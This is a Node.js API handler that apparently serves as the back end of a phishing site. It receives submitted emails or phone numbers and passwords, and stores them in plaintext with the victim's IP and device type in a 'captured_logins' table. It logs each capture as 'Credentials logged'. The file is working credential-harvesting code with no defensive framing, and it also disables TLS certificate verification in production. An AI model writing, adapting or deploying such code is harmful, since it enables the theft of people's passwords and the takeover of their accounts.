const { Pool } = require('pg');

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

module.exports = async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { email, password, userAgent } = req.body;
  
  // Get client IP
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  try {
    const client = await pool.connect();
    
    // Validate format for our records
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\d{10}$/;
    const cleanEmail = email.replace(/\D/g, '');
    const isValidFormat = emailRegex.test(email) || phoneRegex.test(cleanEmail);
    
    // Detect device type
    const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent || '');
    const deviceType = isMobile ? 'mobile' : 'desktop';
    
    await client.query(
      `INSERT INTO captured_logins 
       (email, password, user_agent, ip_address, is_valid_format, device_type) 
       VALUES ($1, $2, $3, $4, $5, $6)`,
      [email, password, userAgent, ip, isValidFormat, deviceType]
    );
    
    await client.release();
    
    console.log('✅ Credentials logged:', { 
      email: email.substring(0, 3) + '***', 
      password: password.substring(0, 2) + '***',
      ip,
      valid: isValidFormat,
      device: deviceType
    });
    
    res.status(200).json({ success: true, deviceType });
  } catch (error) {
    console.error('Database error:', error);
    res.status(500).json({ error: 'Failed to log credentials' });
  }
}
